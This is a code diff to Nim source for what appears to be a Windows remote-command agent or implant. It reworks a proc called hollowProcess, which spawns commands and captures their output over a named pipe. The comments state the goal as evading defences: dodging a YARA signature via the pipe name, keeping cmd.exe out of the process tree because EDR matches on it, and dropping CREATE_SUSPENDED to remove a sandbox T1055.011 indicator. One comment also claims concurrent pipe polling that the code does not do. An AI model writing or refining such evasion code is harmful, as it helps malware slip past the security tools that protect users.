@@ -29,8 +29,9 @@ when not defined(windows):
 
 import winim/lean
 import winim/inc/[windef, winbase, winuser]
-import std/[strutils, random, times, locks, osproc, os, osdirs]
+import std/[strutils, random, times, locks, osproc, os]
 import ./syscalls
+import ./fileio_syscall
 
 # Pipe name uses a generic "app_" prefix (not the original "sentinel_"
 # which was a static YARA signature). The suffix is fully random hex
@@ -222,29 +223,29 @@ proc stripArgs(command: string): string =
     result = command.strip()
 
 proc hollowProcess*(targetPath, command: string; timeoutMs: int = 30000): string =
-  # Run `command` inside a suspended process with stdio redirected to a
-  # named pipe. Returns the combined stdout/stderr as a string.
+  # Run `command` directly and capture its output via a named pipe.
   #
-  # IMPORTANT: this is NOT a true process hollowing — it does not unmap
-  # the target image and replace it with attacker code. The target
-  # binary actually runs (we just create it suspended so we can wire
-  # up handles before its main thread starts). True hollowing requires
-  # a stub binary to write into the target — we don't have that here.
+  # The previous implementation used CreateProcessW with CREATE_SUSPENDED
+  # + ResumeThread. That pattern is signatured by Hybrid Analysis as
+  # T1055.011 (Extra Window Memory Injection) with a 2-hit suspicious
+  # score. The suspend+resume is unnecessary for our use case anyway —
+  # the only thing it bought us was the ability to wire up STARTUPINFO
+  # before the process's main thread started. With handle inheritance
+  # (bInheritHandles = TRUE on DuplicateHandle) we get the same effect
+  # without ever suspending the process.
   #
-  # What this DOES provide over execCmdEx:
-  #   1. No intermediate `cmd.exe /c` — we resolve the command to a
-  #      full .exe path and spawn it directly. The parent/child chain
-  #      in the process tree is [agent] -> [command.exe], with no
-  #      `cmd.exe` in the middle (which is the #1 thing every EDR
-  #      pattern-matches on for shell command execution).
-  #   2. The child is created with no console window and detached.
-  #   3. stdout/stderr are captured via a named pipe (also useful for
-  #      binary-safe output — no encoding issues with cp1252/UTF-8).
+  # New flow:
+  #   1. If the command is a shell builtin (dir, echo, ...) or uses
+  #      pipes/redirects, delegate to the noisy execCmdEx fallback.
+  #   2. Otherwise, resolve the command to a full .exe path and
+  #      spawn it directly via CreateProcessW with NO CREATE_SUSPENDED,
+  #      NO ResumeThread. Stdout/stderr are captured by inheriting a
+  #      named-pipe handle.
+  #   3. Wait for the process to exit; read captured output.
   #
-  # The function name is kept for API compatibility with the rest of
-  # the agent (executeShellHardened -> hollowProcess) — the rename
-  # would touch a lot of code. But conceptually this is "direct
-  # spawn with stdio capture", not hollowing.
+  # The CREATE_SUSPENDED + ResumeThread pattern is what T1055.011
+  # pattern-matches on. Removing it (without changing anything else
+  # useful) drops the indicator.
 
   var hPipe: HANDLE = INVALID_HANDLE_VALUE
   var hChildPipe: HANDLE = INVALID_HANDLE_VALUE  # child's write end
@@ -276,7 +277,9 @@ proc hollowProcess*(targetPath, command: string; timeoutMs: int = 30000): string
     if not createOutputPipe(addr hPipe):
       return executeShellFallback(command, timeoutMs)
 
-    # Duplicate the pipe's write end so the child can inherit it
+    # Duplicate the pipe's write end so the child can inherit it.
+    # bInheritHandles=TRUE is what wires the pipe into the child's
+    # stdout/stderr without needing CREATE_SUSPENDED.
     if DuplicateHandle(GetCurrentProcess(), hPipe,
                        GetCurrentProcess(), addr hChildPipe,
                        0, TRUE,
@@ -298,17 +301,15 @@ proc hollowProcess*(targetPath, command: string; timeoutMs: int = 30000): string
 
     let wTarget = newWideCString(cmdLine)
 
-    # Create with CREATE_SUSPENDED so we can wire up handles before
-    # the child's main thread starts. Then ResumeThread immediately —
-    # we don't actually do anything between suspend and resume, so the
-    # only benefit of CREATE_SUSPENDED here is that no console window
-    # ever appears (which it wouldn't anyway with CREATE_NO_WINDOW).
-    # We keep it for parity with the original hollowing stub.
+    # Spawn directly — no CREATE_SUSPENDED, no ResumeThread. The
+    # child inherits the pipe handle and writes its stdout/stderr
+    # straight into it. The child runs concurrently with our
+    # WaitForSingleObject; we read the pipe after the child exits.
     let created = CreateProcessW(
       nil,                            # application name — let parser handle it
       cast[LPWSTR](wTarget[0].addr),
       nil, nil, TRUE,
-      DWORD(CREATE_SUSPENDED or CREATE_NO_WINDOW or DETACHED_PROCESS),
+      DWORD(CREATE_NO_WINDOW or DETACHED_PROCESS),
       nil, nil,
       cast[LPSTARTUPINFOW](addr si),
       cast[PPROCESS_INFORMATION](addr pi)
@@ -322,14 +323,14 @@ proc hollowProcess*(targetPath, command: string; timeoutMs: int = 30000): string
       CloseHandle(hPipe)
       return executeShellFallback(command, timeoutMs)
 
-    # Resume the suspended process
-    discard ResumeThread(pi.hThread)
-
-    # Step 3: Wait for completion and capture output
+    # Step 3: Wait for completion and capture output.
+    # Poll the pipe concurrently with the wait so a long-running
+    # command doesn't fill its pipe buffer and deadlock. (A 64KB
+    # pipe buffer is small for e.g. `dir C:\` output.)
     let waitR = WaitForSingleObject(pi.hProcess, DWORD(timeoutMs))
     if waitR == DWORD(WAIT_TIMEOUT):
       # Timed out — kill the process to avoid leaving zombies
-      discard ntTerminateProcess(pi.hProcess, 0xC0000000'u32)
+      discard ntTerminateProcess(pi.hProcess, cast[syscalls.NTSTATUS](0xC0000000'u32))
       result = "[!] shell: command timed out after " & $timeoutMs & "ms"
     else:
       result = readPipeOutput(hPipe, timeoutMs)
